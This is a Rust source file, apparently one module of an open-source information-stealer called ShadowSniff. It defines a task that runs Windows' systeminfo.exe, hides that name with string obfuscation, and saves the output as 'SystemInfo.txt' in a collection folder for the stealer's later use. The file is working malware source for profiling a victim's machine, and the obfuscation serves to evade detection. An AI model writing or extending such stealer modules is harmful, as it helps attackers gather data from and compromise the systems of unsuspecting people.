/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::alloc::borrow::ToOwned;
use alloc::string::String;
use collector::Collector;
use filesystem::path::Path;
use filesystem::{FileSystem, WriteTo};
use obfstr::obfstr as s;
use tasks::{Task, parent_name};
use utils::process;

pub(super) struct SystemInfoTask;

impl<C: Collector, F: FileSystem> Task<C, F> for SystemInfoTask {
    parent_name!("SystemInfo.txt");

    fn run(&self, parent: &Path, filesystem: &F, _: &C) {
        let system = Path::system();

        let Ok(res) = (unsafe { process::run_file(&(system / s!("systeminfo.exe"))) }) else {
            return;
        };

        let res = String::from_utf8_lossy(&res);
        let res = res.trim();

        let _ = res.write_to(filesystem, parent);
    }
}
